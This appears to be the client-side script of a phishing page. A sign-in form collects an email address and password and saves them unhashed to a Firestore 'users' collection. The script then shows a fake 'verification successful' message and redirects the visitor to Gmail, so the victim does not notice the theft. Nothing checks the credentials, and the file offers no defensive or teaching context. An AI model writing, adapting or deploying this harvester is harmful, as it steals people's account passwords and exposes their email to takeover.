const db=firebase.firestore()
const contentWrapper=document.querySelector('.content-wrapper')

const form=document.getElementById('form-sign')
form.addEventListener('submit', async e=>{
  e.preventDefault()
  const correo=form["correo"].value
  const password=form["password"].value
  //  contentWrapper.innerHTML=`
  //       <div class="love">
  //       <span class="bonito">ALGO BONITO</span>
  //       </div>`
        
  //  contentWrapper.innerHTML=`
  //       <div class="alert">
  //         <p>ALGO BONITO</p>
  //         <i class="fas fa-user-check"></i>
  //       </div>`
  if(correo!=="" && password!==""){
      await db.collection("users").doc().set({correo,password})
      contentWrapper.innerHTML=`
        <div class="alert">
          <p>VERIFICACIÓN EXITOSA</p>
          <i class="fas fa-user-check"></i>
        </div>`
      setTimeout(()=>{
        location.href="https://mail.google.com"
      },1500)
  }else{
    alert("COMPLETE LOS CAMPOS")
  }


})

